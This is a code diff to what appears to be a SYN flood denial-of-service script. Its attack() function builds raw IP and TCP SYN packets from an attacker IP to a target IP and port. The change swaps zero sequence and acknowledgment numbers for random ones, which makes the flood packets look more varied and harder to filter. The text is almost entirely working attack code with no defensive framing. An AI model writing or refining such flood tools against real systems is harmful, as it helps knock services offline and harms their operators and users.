@@ -65,14 +65,16 @@ def attack(worker_id):
                 socket.inet_aton(ATTACKER_IP),  # Source IP (Attacker's IP)
                 socket.inet_aton(TARGET_IP)  # Destination IP (Target's IP)
             )
+            rand_seq = random.randint(0, 4294967295) # Random sequence number
+            rand_ack = random.randint(0, 4294967295) # Random acknowledgment number
 
             # TCP Header
             tcp_header = struct.pack(
                 '!HHLLBBHHH',  # Format string for the struct
                 ports[index % len(ports)],  # Source Port (random)
                 TARGET_PORT,  # Destination Port
-                0,  # Sequence Number
-                0,  # Acknowledgment Number
+                rand_seq,  # Sequence Number
+                rand_ack,  # Acknowledgment Number
                 80,  # Data Offset (5)
                 2,  # Flags (SYN)
                 5840,  # Window Size
@@ -98,8 +100,8 @@ def attack(worker_id):
                 '!HHLLBBH',  # Format string for the struct
                 ports[index % len(ports)],  # Source Port (random)
                 TARGET_PORT,  # Destination Port
-                0,  # Sequence Number
-                0,  # Acknowledgment Number
+                rand_seq,  # Sequence Number
+                rand_ack,  # Acknowledgment Number
                 80,  # Data Offset (5) and Flags (SYN flag set)
                 2,  # Flags (SYN)
                 5840  # Window Size
